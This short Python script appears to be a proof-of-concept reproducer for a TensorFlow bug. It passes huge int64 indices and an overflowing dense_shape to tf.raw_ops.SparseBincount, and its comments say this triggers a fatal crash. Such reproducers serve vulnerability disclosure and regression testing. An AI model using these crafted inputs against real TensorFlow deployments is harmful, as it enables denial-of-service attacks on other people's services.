import tensorflow as tf

# Create tensors with problematic large integer values
indices = tf.constant([[3026414551496130560, 2738188573441261603],
                      [8970181431921507328, 8970181431921507328]], 
                     dtype=tf.int64)

values = tf.constant([2088533116, 2088533116], dtype=tf.int32)

# This dense_shape causes integer overflow when dimensions are multiplied
dense_shape = tf.constant([8970181431921507452, 8970181431921507452], dtype=tf.int64)

size = tf.constant(2088533116, dtype=tf.int32)
weights = tf.constant([], dtype=tf.int32)

# This call causes the fatal crash
result = tf.raw_ops.SparseBincount(
    indices=indices,
    values=values,
    dense_shape=dense_shape,
    size=size,
    weights=weights,
    binary_output=False
)